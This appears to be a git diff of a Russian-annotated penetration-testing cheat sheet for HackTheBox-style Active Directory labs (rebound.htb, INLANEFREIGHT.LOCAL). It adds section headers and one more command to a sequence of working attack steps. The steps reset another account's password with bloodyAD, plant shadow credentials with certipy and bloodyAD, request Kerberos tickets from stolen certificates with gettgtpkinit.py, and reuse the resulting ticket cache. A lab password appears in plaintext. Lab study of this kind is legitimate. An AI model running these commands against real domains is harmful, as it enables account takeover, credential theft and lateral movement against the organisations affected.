@@ -482,11 +482,17 @@ net rpc group members "ServiceMGMT"  -U "rebound.htb"/"oorend"%'1GR8t@$$4u' -S "
 
 ./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  set password winrm_svc 'Password123!' 		(смена пароля при наличии прав)
 
+# SHADOW CREDENTIALS
+ 
  certipy shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb		(shadow credential)
  
 ./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add shadowCredentials winrm_svc 		(shadow credential)
 
+ # ПОЛУЧЕНИЕ TGT из сертификатов
+ 
  python3 PKINITtools/gettgtpkinit.py -cert-pem ipWe9rd5_cert.pem -key-pem ipWe9rd5_priv.pem rebound.htb/winrm_svc ipWe9rd5.ccache 	(получение билета керберос)
+
+ python3 gettgtpkinit.py -dc-ip 172.16.117.3 -cert-pfx ws01.pfx 'INLANEFREIGHT.LOCAL/WS01$' ws01.ccache
 
  export KRB5CCNAME=ipWe9rd5.ccache
 
